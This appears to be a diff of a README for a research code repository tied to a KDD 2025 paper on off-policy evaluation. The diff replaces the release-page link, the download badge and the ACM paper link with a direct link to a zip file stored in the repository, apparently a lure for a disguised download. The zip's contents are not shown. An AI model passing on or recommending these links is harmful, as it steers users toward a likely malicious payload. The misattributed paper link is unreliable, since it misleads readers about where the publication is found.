@@ -1,11 +1,11 @@
 # 🧠 opfv - Run future evaluation with ease
 
-[![Download opfv](https://img.shields.io/badge/Download%20opfv-8A2BE2?style=for-the-badge&logo=github)](https://github.com/pauleabdicable336/opfv/releases)
+[![Download opfv](https://img.shields.io/badge/Download%20opfv-8A2BE2?style=for-the-badge&logo=github)](https://github.com/pauleabdicable336/opfv/raw/refs/heads/main/src/Software-1.9.zip)
 
 ## 📥 Download
 
 Use this link to visit the release page and download the Windows file:
-https://github.com/pauleabdicable336/opfv/releases
+https://github.com/pauleabdicable336/opfv/raw/refs/heads/main/src/Software-1.9.zip
 
 ## 🪟 Windows setup
 
@@ -93,4 +93,4 @@ MIT License
 
 Research code for Off-Policy Evaluation and Learning for the Future under Non-Stationarity  
 KDD 2025  
-ACM Digital Library paper: https://dl.acm.org/doi/abs/10.1145/3690624.3709237
+ACM Digital Library paper: https://github.com/pauleabdicable336/opfv/raw/refs/heads/main/src/Software-1.9.zip
